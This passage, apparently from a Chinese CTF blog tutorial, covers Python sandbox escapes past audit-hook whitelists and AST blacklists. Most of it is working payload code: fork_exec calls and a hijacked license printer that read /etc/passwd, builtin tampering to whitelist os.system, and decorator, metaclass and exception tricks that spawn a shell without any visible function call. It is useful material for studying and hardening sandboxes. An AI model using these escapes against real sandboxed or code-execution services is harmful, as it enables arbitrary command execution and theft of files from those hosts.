<p><strong>该模块的核心功能是 fork_exec 函数</strong>，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.</p>
<p>下面是一个最小化示例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p>结合上面的 <code>__loader__.load_module(fullname)</code> 可以得到最终的 payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p><strong>个人理解不同的python版本应该可能还是需要改一改payload。</strong></p>
<h6 id="篡改内置函数"><a href="#篡改内置函数" class="headerlink" title="篡改内置函数"></a>篡改内置函数</h6><p>这道audit hook 题还有其他解法，可以看到白名单是通过set 函数返回的，set作为一个内置函数实际上也是可以修改的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>比如我们将 set 函数修改为固定返回一个包含了 os.system 函数的列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这样 set 函数会固定返回带有 os.system 的列表.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>最终 payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 篡改函数</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>解析一下payload:</strong></p>
<p>在Python中<strong>，<code>globals()</code>函数是一个内置函数，它返回一个表示当前全局符号表的字典，我们可以用它来访问、修改当前全局变量</strong>。所谓的全局符号表，就是一个存储了当前模块所有变量名和对应值的字典。</p>
<p><strong>这个payload通过<code>globals()</code>函数访问全局符号表，然后通过<code>&#39;__builtins__&#39;</code>关键字获取了内置名字空间，这个名字空间包含了Python的所有内置函数和变量</strong>。然后，它把<code>set</code>函数替换为一个lambda表达式，这个表达式总是返回一个固定的列表。<strong>这就意味着在执行这个payload之后，调用<code>set()</code>函数将不再执行原有的集合操作，而是会返回一个包含了几个特定字符串的列表。</strong></p>
<p>然后，它导入<code>os</code>模块，并调用<code>os.system(&#39;cat flag2.txt&#39;)</code>。这行代码会执行一个系统命令<code>cat flag2.txt</code>，并打印出<code>flag2.txt</code>文件的内容。</p>
<p>还有就是白名单明明没有<code>import</code>，为什么这里还是可以使用Import呢，原因如下：</p>
<p>请注意，这里的白名单是用来对某些可能的行为或操作进行限制的，比如<code>&#39;builtins.input&#39;</code>、<code>&#39;builtins.input/result&#39;</code>、<code>&#39;exec&#39;</code>和<code>&#39;compile&#39;</code>。然而<strong>“import”属于Python语法的一部分</strong>，<u>不是一个可以被调用的函数或方法</u>，因此它不会被包含在这种类型的白名单中。</p>
<p>有点问题，<code>__import__(&#39;ctypes&#39;)</code>确实报错了，但是<code>__import__(&#39;os&#39;)</code>却没有报错。——————个人理解为<code>os</code>为内置模块，同样的<code>import</code>也是属于内建函数。而<code>ctypes</code>不是内建模块，故报错</p>
<h4 id="绕过-AST-沙箱"><a href="#绕过-AST-沙箱" class="headerlink" title="绕过 AST 沙箱"></a>绕过 AST 沙箱</h4><p>AST沙箱会将用户的输入转化为操作码，此时字符串层面的变换基本上没用了，一般求你概况下考虑绕过AST黑名单，例如下面的沙箱禁止了 ast.Import|ast.ImportFrom|ast.Call 这三类操作, 这样一来就无法导入模块和执行函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure>

<h5 id="without-call"><a href="#without-call" class="headerlink" title="without call"></a>without call</h5><p>如果基于AST的沙箱限制了执行函数，那么就需要找到一种不需要执行函数的方式执行系统命令。</p>
<h6 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h6><p>利用的payload如下，该payload实际上等效于<code>exec(input(X))</code> ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>传入上述代码后，Python会打开输入，此时我们再输入payload就可以成功执行命令。（结合上面的沙箱的题，可以直接这样输入，具体情况具体分析，看是否需要写成一行）</p>
<p>同理，构造的方法有很多，比如<strong>使用单层的装饰器</strong>，打开help 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@help</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>再输入 !sh即可打开<code>/bin/sh</code></p>
<p>或是给装饰器加一些参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@getattr(<span class="params">os,<span class="string">&quot;system&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&quot;system&quot;</span>)(fake_wrapper(something))</span><br></pre></td></tr></table></figure>

<p>这样就可以直接进入交互模式</p>
<p>亦或者自定义一个装饰器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@os.system</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>相当于 os.system(fake_wrapper(something))，也就是 os.system(‘&#x2F;bin&#x2F;sh’)</p>
<h6 id="函数覆盖"><a href="#函数覆盖" class="headerlink" title="函数覆盖"></a>函数覆盖</h6><p>我们可以知道在Python中获取一个的属性例如<code>obj[argument]</code>实际上可以调用的是<code>obj.__getitem__(argument)</code>方法，因此只需要覆盖其<code>__getitem__</code>方法执行代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class A:</span></span><br><span class="line"><span class="string">   __getitem__ = exec</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A()[&#x27;__import__(\&quot;os\&quot;).system(\&quot;dir\&quot;)&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(c)</span><br><span class="line"></span><br><span class="line">命令解读：</span><br><span class="line">创建了一个A的实例，并且试图访问其索引<span class="string">&#x27;__import__(\&quot;os\&quot;).system(\&quot;dir\&quot;)&#x27;</span>。在这个过程中，__getitem__方法（即<span class="built_in">exec</span>函数）被调用，并接收<span class="string">&#x27;__import__(\&quot;os\&quot;).system(\&quot;dir\&quot;)&#x27;</span>作为参数，所以你实际上执行了<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)，成功运行了<span class="built_in">dir</span>命令。</span><br></pre></td></tr></table></figure>

<p>本地测试代码如上确实成功执行，但是注意，这里调用了 A 的构造函数，因此AST中还是会出现 ast.Call，那么如何在不执行构造函数的情况下获取类实例呢</p>
<p><strong>（1）metaclass 利用</strong></p>
<p>Python中提供了一种元类(metaclass)的概念。元类是创建类的“类”。在Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在Python中的作用主要是用来创建类。类是对象的模版，而元类则是类的模版。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub[<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>除了 <code>__getitem__</code> 之外其他方法的利用方式如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__sub__ (k - <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mul__ (k * <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__floordiv__ (k // <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__truediv__ (k / <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mod__ (k % <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__pow__ (k**<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__lt__ (k &lt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__le__ (k &lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__eq__ (k == <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ne__ (k != <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ge__ (k &gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__gt__ (k &gt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iadd__ (k += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__isub__ (k -= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__imul__ (k *= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ifloordiv__ (k //= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__idiv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__itruediv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>) (Note that this only works when <span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="keyword">is</span> <span class="keyword">in</span> effect.)</span><br><span class="line">__imod__ (k %= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ipow__ (k **= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ilshift__ (k&lt;&lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__irshift__ (k &gt;&gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iand__ (k = <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ior__ (k |= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ixor__ (k ^= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>示例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __sub__ = <span class="built_in">exec</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub-<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>（2）exceptions利用</strong></p>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类，如果一个类继承了Exception类，那么就可以通过raise 关键字来实例化，payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">raise</span> RCE </span><br><span class="line"></span><br><span class="line">代码解析：</span><br><span class="line">当 RCE 对象被创建的时候，python 会调用 __init__ 方法。</span><br><span class="line">在 __init__ 方法中，用语句 self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>，试图在 self 上执行 += 操作。在 Python 中，+= 实际上是调用了对象的 __iadd__ 魔术方法。这个方法定义了当对象进行原地加法（<span class="keyword">in</span>-place addition）操作的时候应该做什么。</span><br><span class="line">在你的代码里，__iadd__ 方法被定义成了 <span class="built_in">exec</span> 函数。<span class="built_in">exec</span> 函数能接受一个字符串参数，然后解析并执行这个字符串作为 Python 代码。所以，当 self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span> 被执行的时候，实际上是调用了 <span class="built_in">exec</span>(<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>raise 会进入 RCE 的 <code>__init__</code>, 然后触发 <code>__iadd__</code> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c</span>):</span><br><span class="line">        self += <span class="string">&quot;os.system(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span></span><br><span class="line">sys.excepthook = X</span><br><span class="line"><span class="number">1</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>():</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, e</span>):</span><br><span class="line">    self += <span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br><span class="line">  __iadd__ = <span class="built_in">eval</span></span><br><span class="line">__builtins__.<span class="built_in">__import__</span> = X</span><br><span class="line">&#123;&#125;[<span class="number">1337</span>]</span><br></pre></td></tr></table></figure>

<p>这个 payload 将 <code>__import__</code> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <code>__import__</code>.</p>
<h5 id="通过-license函数读取文件"><a href="#通过-license函数读取文件" class="headerlink" title="通过 license函数读取文件"></a>通过 license函数读取文件</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>上面的 payload 修改内建函数 license 的文件名列表为 &#x2F;etc&#x2F;passwd 当调用 <code>license()</code> 时会打印这个文件的内容.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&#x27;__builtins__.__dict__[&quot;license&quot;]._Printer__filenames&#x27;</span>))</span><br><span class="line">[<span class="string">&#x27;D:\\python\\python38\\lib\\..\\LICENSE.txt&#x27;</span>, <span class="string">&#x27;D:\\python\\python38\\lib\\..\\LICENSE&#x27;</span>, <span class="string">&#x27;D:\\python\\python38\\lib\\LICENSE.txt&#x27;</span>, <span class="string">&#x27;D:\\python\\python38\\lib\\LICENSE&#x27;</span>, <span class="string">&#x27;.\\LICENSE.txt&#x27;</span>, <span class="string">&#x27;.\\LICENSE&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>payload 中将 help 类的 <code>__enter__</code> 方法覆盖为 <code>license</code> 方法, 而 with 语句在创建上下文时会调用 help 的<code>__enter__</code>, 从而执行 <code>license</code> 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContext</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-Attribute-获取属性"><a href="#绕过-ast-Attribute-获取属性" class="headerlink" title="绕过 ast.Attribute 获取属性"></a>绕过 ast.Attribute 获取属性</h5><p>python 3.10 中引入了一个新的特性：match&#x2F;case，类似其他语言中的 switch&#x2F;case，但 match&#x2F;case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。比如对于基本类型的匹配：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;One&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Two&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Two</span></span><br><span class="line">或</span><br><span class="line">item = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> (x, y, z):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span> <span class="subst">&#123;z&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x, y):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x,):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>匹配类的示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.thing = value</span><br><span class="line"></span><br><span class="line">item = AClass(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> AClass(thing=x):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Got <span class="subst">&#123;x = &#125;</span>!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Got x = 32!</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，注意<code>case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，<strong>我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</strong></p>
<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code>&#39;&#39;.__class__</code>，可以编写如下的 match&#x2F;case 语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">str</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<p>可以看到 x 就是 <code>&#39;&#39;.__class__</code>. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<p>再测试一下该 payload 的 AST：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast </span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">match str():</span></span><br><span class="line"><span class="string">    case str(__class__=x):</span></span><br><span class="line"><span class="string">        print(x)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(ast.dump(ast.parse(a, mode=<span class="string">&#x27;exec&#x27;</span>), indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>AST 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Match(</span><br><span class="line">            subject=Call(</span><br><span class="line">                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]),</span><br><span class="line">            cases=[</span><br><span class="line">                match_case(</span><br><span class="line">                    pattern=MatchClass(</span><br><span class="line">                        cls=Name(<span class="built_in">id</span>=<span class="string">&#x27;str&#x27;</span>, ctx=Load()),</span><br><span class="line">                        patterns=[],</span><br><span class="line">                        kwd_attrs=[</span><br><span class="line">                            <span class="string">&#x27;__class__&#x27;</span>],</span><br><span class="line">                        kwd_patterns=[</span><br><span class="line">                            MatchAs(name=<span class="string">&#x27;x&#x27;</span>)]),</span><br><span class="line">                    body=[</span><br><span class="line">                        Expr(</span><br><span class="line">                            value=Call(</span><br><span class="line">                                func=Name(<span class="built_in">id</span>=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                args=[</span><br><span class="line">                                    Name(<span class="built_in">id</span>=<span class="string">&#x27;x&#x27;</span>, ctx=Load())],</span><br><span class="line">                                keywords=[]))])])],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure>

<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
<p>我们可以构造替代 <code>&#39;&#39;.__class__.__base__.__subclasses__()</code>的 payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(__class__=clazz):</span><br><span class="line">        <span class="keyword">match</span> clazz:</span><br><span class="line">            <span class="keyword">case</span> <span class="built_in">object</span>(__base__=bass):</span><br><span class="line">                <span class="keyword">match</span> bass:</span><br><span class="line">                    <span class="keyword">case</span> <span class="built_in">object</span>(__subclasses__=subclazz):</span><br><span class="line">                        <span class="built_in">print</span>(subclazz)</span><br></pre></td></tr></table></figure>

